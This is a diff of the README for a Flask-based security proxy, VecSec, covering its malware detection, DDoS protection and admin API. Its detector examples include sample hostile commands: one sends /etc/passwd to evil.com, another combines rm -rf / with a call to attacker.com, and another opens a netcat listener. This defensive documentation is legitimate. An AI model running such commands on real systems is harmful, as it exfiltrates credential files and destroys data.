@@ -1,167 +1,249 @@
-# Flask Proxy Server with Malware-BERT
+# 🛡️ VecSec - Advanced Security Proxy
 
-A flexible HTTP proxy server built with Flask that can forward requests to any target URL while providing security controls, logging, and **AI-powered malware detection** using Malware-BERT.
+<div align="center">
 
-## Features
+![VecSec Logo](https://img.shields.io/badge/VecSec-Security%20Proxy-blue?style=for-the-badge&logo=shield&logoColor=white)
 
-- **Universal Proxy**: Forward any HTTP method (GET, POST, PUT, DELETE, etc.) to any target URL
-- **AI-Powered Malware Detection**: Real-time analysis using Malware-BERT transformer model
-- **Pattern-Based Detection**: Detects shell commands, encoded payloads, suspicious URLs, and script injection
-- **Comprehensive DDoS Protection**: Production-ready rate limiting and attack prevention
-- **Security Controls**: URL validation, host allowlisting, and path blocking
-- **Request/Response Forwarding**: Preserves headers and request body
-- **Real-Time Blocking**: Automatically blocks malicious requests and responses
-- **Error Handling**: Comprehensive error handling with appropriate HTTP status codes
-- **Logging**: Request logging for monitoring and debugging
-- **Health Check**: Built-in health check endpoint
-- **Configuration**: Runtime configuration viewing
-- **Admin API**: Management endpoints for monitoring and configuration
+**Enterprise-Grade HTTP Proxy with AI-Powered Threat Detection & DDoS Protection**
 
-## Malware-BERT Detection
+[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat&logo=python&logoColor=white)](https://python.org)
+[![Flask](https://img.shields.io/badge/Flask-2.3%2B-green?style=flat&logo=flask&logoColor=white)](https://flask.palletsprojects.com)
+[![Docker](https://img.shields.io/badge/Docker-Ready-blue?style=flat&logo=docker&logoColor=white)](https://docker.com)
+[![License](https://img.shields.io/badge/License-MIT-green?style=flat)](LICENSE)
 
-The proxy includes an AI-powered malware detection system that analyzes:
+</div>
 
-### Detected Patterns
-- **Shell Commands**: `rm -rf /`, `curl`, `wget`, `nc`, `bash`, `powershell`
-- **Encoded Payloads**: Base64, hex, URL-encoded data
-- **Suspicious URLs**: URL shorteners, suspicious TLDs, IP addresses
-- **Script Injection**: `<script>` tags, `javascript:`, `eval()` functions
-- **Network C2 Patterns**: Beaconing, data exfiltration commands
-- **File Operations**: Destructive commands, persistence mechanisms
+## 🚀 What is VecSec?
 
-### Threat Levels
-- **Clean**: Benign text/code
-- **Suspicious**: Partial indicators (encoded strings, suspicious imports)
-- **Malicious**: Clearly malicious payloads
+VecSec is a next-generation HTTP proxy server that combines **AI-powered malware detection**, **comprehensive DDoS protection**, and **advanced security controls** to protect your infrastructure from modern cyber threats.
 
-### Detection Methods
-1. **Pattern-Based**: Regex patterns for known attack vectors
-2. **ML-Based**: BERT transformer model trained on malware samples
-3. **Combined**: Both methods working together for maximum accuracy
+### 🎯 Key Capabilities
 
-## DDoS Protection Features
+- **🤖 AI-Powered Malware Detection** - Real-time analysis using Malware-BERT transformer model
+- **🛡️ DDoS Protection** - Production-ready rate limiting and attack prevention
+- **🔍 Pattern-Based Detection** - Detects shell commands, encoded payloads, suspicious URLs, and script injection
+- **⚡ High Performance** - Built with Flask and optimized for enterprise workloads
+- **🐳 Docker Ready** - Easy deployment with Docker Compose
+- **📊 Real-Time Monitoring** - Comprehensive admin API and statistics
 
-The proxy includes comprehensive DDoS protection with the following capabilities:
+## 🔥 Core Features
 
-### Rate Limiting
+### 🤖 AI-Powered Malware Detection
+- **Malware-BERT Model**: Advanced transformer-based threat detection
+- **Real-Time Analysis**: Instant scanning of requests and responses
+- **Pattern Recognition**: Detects shell commands, encoded payloads, and script injection
+- **Threat Classification**: Clean, Suspicious, or Malicious categorization
+- **Automatic Blocking**: Prevents malicious content from reaching your systems
+
+### 🛡️ Enterprise DDoS Protection
+- **Multi-Layer Defense**: Rate limiting, connection management, and request validation
+- **Redis Integration**: Distributed protection across multiple instances
+- **IP Management**: Allowlist, blocklist, and automatic violation tracking
+- **Admin Dashboard**: Real-time monitoring and management capabilities
+- **Configurable Limits**: Customizable per-IP and per-endpoint restrictions
+
+### ⚡ High-Performance Proxy
+- **Universal HTTP Support**: All HTTP methods and protocols
+- **Header Preservation**: Maintains request/response integrity
+- **URL Validation**: Security controls and host filtering
+- **Error Handling**: Comprehensive error responses and logging
+- **Health Monitoring**: Built-in health checks and status endpoints
+
+### 📊 Monitoring & Administration
+- **Real-Time Stats**: Live protection metrics and system health
+- **RESTful API**: Complete programmatic control
+- **Detailed Logging**: Comprehensive attack and system logging
+- **Configuration Management**: Runtime configuration updates
+
+## 🎯 Threat Detection Capabilities
+
+### 🔍 Malware-BERT AI Detection
+
+VecSec uses advanced AI to detect and block malicious content in real-time:
+
+| Threat Type | Examples | Detection Method |
+|-------------|----------|------------------|
+| **Shell Commands** | `rm -rf /`, `curl`, `wget`, `nc`, `bash`, `powershell` | Pattern + ML |
+| **Encoded Payloads** | Base64, hex, URL-encoded data | Pattern Analysis |
+| **Suspicious URLs** | URL shorteners, suspicious TLDs, IP addresses | Pattern Matching |
+| **Script Injection** | `<script>` tags, `javascript:`, `eval()` functions | Pattern + ML |
+| **Network C2** | Beaconing, data exfiltration commands | Pattern Analysis |
+| **File Operations** | Destructive commands, persistence mechanisms | Pattern Matching |
+
+### 🚨 Threat Classification
+
+| Level | Description | Action |
+|-------|-------------|--------|
+| **🟢 Clean** | Benign text/code | Allow |
+| **🟡 Suspicious** | Partial indicators (encoded strings, suspicious imports) | Log + Monitor |
+| **🔴 Malicious** | Clearly malicious payloads | Block Immediately |
+
+### 🧠 Detection Methods
+
+1. **Pattern-Based Detection**: Regex patterns for known attack vectors
+2. **ML-Based Detection**: BERT transformer model trained on malware samples  
+3. **Combined Analysis**: Both methods working together for maximum accuracy
+
+## 🛡️ DDoS Protection Features
+
+VecSec provides enterprise-grade DDoS protection with multiple layers of defense:
+
+### ⚡ Rate Limiting
 - **Per-IP Limits**: Configurable requests per minute/hour/day
-- **Per-Endpoint Limits**: Custom limits for specific endpoints
+- **Per-Endpoint Limits**: Custom limits for specific endpoints  
 - **Sliding Window**: Token bucket algorithm for fair rate limiting
 - **Redis Support**: Distributed rate limiting across multiple instances
 
-### Connection Management
+### 🔗 Connection Management
 - **Concurrent Limits**: Maximum connections per IP
 - **Connection Tracking**: Real-time connection monitoring
 - **Slowloris Protection**: Detection of slow request attacks
 - **Timeout Management**: Configurable request timeouts
 
-### Request Validation
+### ✅ Request Validation
 - **Size Limits**: Maximum request and header sizes
 - **Content Validation**: Malware scanning of request/response content
 - **Header Sanitization**: Removal of hop-by-hop headers
 - **URL Validation**: Only HTTP/HTTPS URLs allowed
 
-### IP Management
+### 🌐 IP Management
 - **Allowlist/Blocklist**: Permanent IP management
 - **Automatic Blocking**: Temporary blocking after violations
 - **Violation Tracking**: Count and track rate limit violations
 - **Admin API**: Programmatic IP management
 
-### Monitoring & Administration
+### 📊 Monitoring & Administration
 - **Real-Time Stats**: Live monitoring of protection metrics
 - **Admin Endpoints**: RESTful API for management
 - **Detailed Logging**: Comprehensive attack logging
 - **Health Checks**: System health monitoring
 
-## Installation
+## 🚀 Quick Start
 
-### Using Docker Compose (Recommended)
+### Option 1: Docker Compose (Recommended for Production)
 
-1. Clone this repository
-2. Start the services:
-   ```bash
-   docker-compose up -d
-   ```
-3. Access the proxy at `http://localhost:8080`
-4. Optional: Access Redis Commander at `http://localhost:8081`
-
-### Using uv (Development)
-
-1. Install [uv](https://docs.astral.sh/uv/getting-started/installation/) if you haven't already
-2. Clone or download this repository
-3. Install dependencies:
-   ```bash
-   uv sync
-   ```
-
-### Using pip (Alternative)
-
-1. Clone or download this repository
-2. Install dependencies:
-   ```bash
-   pip install flask requests werkzeug flask-limiter redis python-dotenv
-   ```
-
-## Usage
-
-### Basic Usage
-
-Start the proxy server:
-
-**Using uv:**
 ```bash
+# Clone the repository
+git clone https://github.com/your-org/vecsec.git
+cd vecsec
+
+# Start all services
+docker-compose up -d
+
+# Verify installation
+curl http://localhost:8080/health
+```
+
+**Access Points:**
+- 🛡️ **VecSec Proxy**: `http://localhost:8080`
+- 📊 **Redis Commander**: `http://localhost:8081` (optional)
+- 🔧 **Admin API**: `http://localhost:8080/admin/ddos/stats`
+
+### Option 2: Development Setup
+
+```bash
+# Install uv (if not already installed)
+curl -LsSf https://astral.sh/uv/install.sh | sh
+
+# Clone and setup
+git clone https://github.com/your-org/vecsec.git
+cd vecsec
+uv sync
+
+# Start the server
 uv run python app.py
 ```
 
-**Using pip:**
+### Option 3: Traditional pip Installation
+
 ```bash
+# Clone repository
+git clone https://github.com/your-org/vecsec.git
+cd vecsec
+
+# Install dependencies
+pip install -r requirements.txt
+
+# Start the server
 python app.py
 ```
 
-The server will start on `http://localhost:8080`
+## 📖 Usage Guide
 
-### Proxy Requests
+### 🔧 Basic Proxy Usage
 
-Use the `target` query parameter to specify the destination URL:
+VecSec acts as a secure HTTP proxy, forwarding requests while providing protection:
 
 ```bash
-# GET request to GitHub API
+# Basic GET request
 curl "http://localhost:8080/?target=https://api.github.com/users/octocat"
 
 # POST request with JSON data
 curl -X POST "http://localhost:8080/?target=https://httpbin.org/post" \
   -H "Content-Type: application/json" \
-  -d '{"key": "value"}'
+  -d '{"message": "Hello World"}'
 
-# Request with path
-curl "http://localhost:8080/users/123?target=https://jsonplaceholder.typicode.com"
+# Request with path and query parameters
+curl "http://localhost:8080/users/123?target=https://jsonplaceholder.typicode.com&include=posts"
 ```
 
-### Special Endpoints
+### 🛡️ Security Features in Action
 
-- **Health Check**: `GET /health` - Returns server status
-- **Configuration**: `GET /config` - Shows current configuration
-- **Malware Analysis**: `POST /analyze` - Analyze text content for malware
-- **File Scanning**: `POST /scan` - Scan uploaded files for malware
-- **Detection Patterns**: `GET /patterns` - View available detection patterns
+**Malicious Request Blocking:**
+```bash
+# This request will be blocked due to malicious content
+curl "http://localhost:8080/?target=https://httpbin.org/get&malicious=rm%20-rf%20/"
 
-### DDoS Protection Admin Endpoints
+# Response:
+# {
+#   "error": "Response blocked due to malicious content",
+#   "malware_analysis": {
+#     "threat_level": "malicious",
+#     "confidence": 0.9,
+#     "indicators": ["Suspicious shell commands detected"]
+#   }
+# }
+```
 
-- **Statistics**: `GET /admin/ddos/stats` - View protection statistics
-- **IP Management**: `GET /admin/ddos/ips` - View IP statistics
-- **Block IP**: `POST /admin/ddos/block/<ip>` - Block an IP address
-- **Unblock IP**: `POST /admin/ddos/unblock/<ip>` - Unblock an IP address
-- **Allowlist**: `POST /admin/ddos/allowlist/<ip>` - Add IP to allowlist
-- **Blocklist**: `POST /admin/ddos/blocklist/<ip>` - Add IP to blocklist
-- **Configuration**: `GET/POST /admin/ddos/config` - View/update configuration
+**Rate Limiting:**
+```bash
+# After exceeding rate limits, requests will be throttled
+for i in {1..10}; do curl http://localhost:8080/health; done
+```
 
-### Malware Detection API
+## 🔌 API Reference
+
+### 🏥 Health & Status
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/health` | GET | Server health status |
+| `/config` | GET | Current configuration |
+
+```bash
+# Check server health
+curl http://localhost:8080/health
+
+# View configuration
+curl http://localhost:8080/config
+```
+
+### 🤖 Malware Detection API
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/analyze` | POST | Analyze text content for malware |
+| `/scan` | POST | Scan uploaded files for malware |
+| `/patterns` | GET | View available detection patterns |
 
 **Analyze Text Content:**
 ```bash
 curl -X POST "http://localhost:8080/analyze" \
   -H "Content-Type: application/json" \
-  -d '{"content": "curl https://evil.com --data \"$(cat /etc/passwd)\"", "use_ml": true}'
+  -d '{
+    "content": "curl https://evil.com --data \"$(cat /etc/passwd)\"",
+    "use_ml": true
+  }'
 ```
 
 **Scan File:**
@@ -175,7 +257,17 @@ curl -X POST "http://localhost:8080/scan" \
 curl "http://localhost:8080/patterns"
 ```
 
-### DDoS Protection API Examples
+### 🛡️ DDoS Protection Admin API
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/admin/ddos/stats` | GET | Protection statistics |
+| `/admin/ddos/ips` | GET | IP statistics and violations |
+| `/admin/ddos/block/<ip>` | POST | Block an IP address |
+| `/admin/ddos/unblock/<ip>` | POST | Unblock an IP address |
+| `/admin/ddos/allowlist/<ip>` | POST | Add IP to allowlist |
+| `/admin/ddos/blocklist/<ip>` | POST | Add IP to blocklist |
+| `/admin/ddos/config` | GET/POST | View/update configuration |
 
 **View Protection Statistics:**
 ```bash
@@ -379,6 +471,127 @@ pip install gunicorn
 gunicorn -w 4 -b 0.0.0.0:8080 app:app
 ```
 
-## License
+## 🎯 Use Cases
 
-This project is open source and available under the MIT License.
+### 🏢 Enterprise Applications
+
+**API Gateway Security**
+- Protect internal APIs from malicious requests
+- Rate limit external clients
+- Scan all incoming/outgoing data for threats
+
+**Microservices Protection**
+- Secure inter-service communication
+- Monitor data exfiltration attempts
+- Block suspicious service calls
+
+**Web Application Firewall**
+- Replace traditional WAFs with AI-powered detection
+- Real-time threat analysis
+- Automatic blocking of malicious content
+
+### 🔒 Security Scenarios
+
+**Data Exfiltration Prevention**
+```bash
+# Block attempts to exfiltrate data
+curl "http://localhost:8080/?target=https://api.example.com/users" \
+  -H "Authorization: Bearer token" \
+  -d '{"query": "SELECT * FROM users WHERE password LIKE \"%admin%\""}'
+```
+
+**Command Injection Protection**
+```bash
+# Block command injection attempts
+curl -X POST "http://localhost:8080/?target=https://api.example.com/exec" \
+  -d '{"command": "rm -rf / && curl http://attacker.com/steal"}'
+```
+
+**DDoS Mitigation**
+```bash
+# Automatic rate limiting and IP blocking
+for i in {1..1000}; do
+  curl http://localhost:8080/health &
+done
+```
+
+## 🚀 Getting Started Examples
+
+### Example 1: Basic Proxy Setup
+
+```bash
+# Start VecSec
+docker-compose up -d
+
+# Test basic proxy functionality
+curl "http://localhost:8080/?target=https://httpbin.org/get"
+
+# Check security status
+curl "http://localhost:8080/health"
+```
+
+### Example 2: Malware Detection
+
+```bash
+# Test malware detection
+curl -X POST "http://localhost:8080/analyze" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "content": "rm -rf / && while true; do nc -l 4444; done",
+    "use_ml": false
+  }'
+```
+
+### Example 3: DDoS Protection
+
+```bash
+# View protection statistics
+curl "http://localhost:8080/admin/ddos/stats"
+
+# Block a suspicious IP
+curl -X POST "http://localhost:8080/admin/ddos/block/192.168.1.100" \
+  -H "Content-Type: application/json" \
+  -d '{"duration": 3600}'
+```
+
+## 🤝 Contributing
+
+We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
+
+### Development Setup
+
+```bash
+# Fork and clone the repository
+git clone https://github.com/your-username/vecsec.git
+cd vecsec
+
+# Install development dependencies
+uv sync --dev
+
+# Run tests
+uv run pytest
+
+# Start development server
+uv run python app.py
+```
+
+## 📄 License
+
+This project is open source and available under the [MIT License](LICENSE).
+
+## 🙏 Acknowledgments
+
+- [Flask](https://flask.palletsprojects.com/) - Web framework
+- [Transformers](https://huggingface.co/transformers/) - AI/ML models
+- [Redis](https://redis.io/) - Distributed caching
+- [Docker](https://docker.com/) - Containerization
+
+---
+
+<div align="center">
+
+**🛡️ VecSec - Protecting Your Infrastructure with AI-Powered Security**
+
+[Documentation](https://github.com/your-org/vecsec/wiki) • [Issues](https://github.com/your-org/vecsec/issues) • [Discussions](https://github.com/your-org/vecsec/discussions)
+
+</div>
